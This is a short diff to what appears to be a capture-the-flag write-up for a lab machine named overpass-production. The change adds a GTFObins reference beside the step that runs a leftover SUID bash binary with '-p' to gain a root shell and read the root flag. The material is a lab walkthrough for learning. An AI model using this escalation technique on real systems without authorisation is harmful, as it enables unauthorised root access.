@@ -205,7 +205,7 @@ Get the flag from `user.txt`:
     drwxrwxr-x 7 james james    4096 Jul 21  2020 www
     james@overpass-production:/home/james$ cat user.txt
 
-And use the conveniently left `.suid_bash`: 
+And use the conveniently left `.suid_bash` (see [GTFObins bash](https://gtfobins.github.io/gtfobins/bash/)): 
 
     james@overpass-production:/home/james$ ./.suid_bash -p
     .suid_bash-4.4# cat /root/root.txt
